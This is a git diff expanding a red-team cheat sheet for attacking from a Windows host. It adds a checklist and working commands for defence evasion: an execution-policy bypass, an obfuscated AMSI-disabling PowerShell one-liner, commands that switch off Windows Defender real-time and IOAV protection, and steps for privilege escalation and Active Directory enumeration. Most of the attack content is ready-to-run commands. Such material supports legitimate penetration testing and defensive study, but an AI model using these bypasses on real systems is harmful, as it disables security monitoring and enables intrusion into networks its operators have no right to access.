@@ -1,5 +1,57 @@
-# RedTeam-CheatSheet
+# RedTeam-CheatSheet From a Windows Host
 
+---
+
+- [CheckLists](#checklists)
+  - [Mandatory](#disable-logging-and-enable-bypasses)
+  - [Local Privilege Escalation](#privilege-escalation)
+  - [Domain Enumeration](#domain-enumeration)
+- [Commands](#commands)
+  - [Bypass PowerShell Logging](#bypass-logging)
+- [Living off the land](#living-off-the-land)
+  - [Active Directory Built in Commands](#ad-enumeration)
+
+---
+
+# Checklists  
+## Disable Logging and Enable Bypasses
+> 1. [ ] Bypass logging - Invisishell 
+> 2. [ ] Bypass PowerShell AMSI on every new user
+> 3. [ ] Bypass Defender (with Admin privs)
+> 4. [ ] .NET AMSI bypass (when required)
+
+## Privilege Escalation
+> 1. [ ] PowerUp.ps1
+
+## Domain Enumeration
+> 1. [ ] Domains, Forests, Trusts, SIDS
+> 2. [ ] Users, fake accounts (password or logon count checks)
+> 3. [ ] Domain computers
+> 4. [ ] Kerberos Policy Information
+> 5. [ ] GPO && OU
+> 6. [ ] ACL's 
+> 7. [ ] Blood-hound
+> 8. [ ] SPN
+
+--- 
+# Commands  
+## Bypass Logging
+### Bypass Execution Policy
+`powershell -ep bypass`
+
+### Bypass AMSI 
+https://amsi.fail/
+```
+sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+
+### Bypass Defender
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+```
+
+--- 
 ## Living off the Land
 https://lolbas-project.github.io/#  
 ### Download Remote File Bypass Examples
@@ -51,6 +103,7 @@ $FileServAD = Get-ADComputer -SearchBase "OU=Servers,DC=corp,dc=ad" -Filter * | 
 Invoke-Command -ComputerName $FileServAD -ScriptBlock {Get-SmbShare -Special $false}
 ```
 
+---
 ## Local
 ### Host Information
 ```
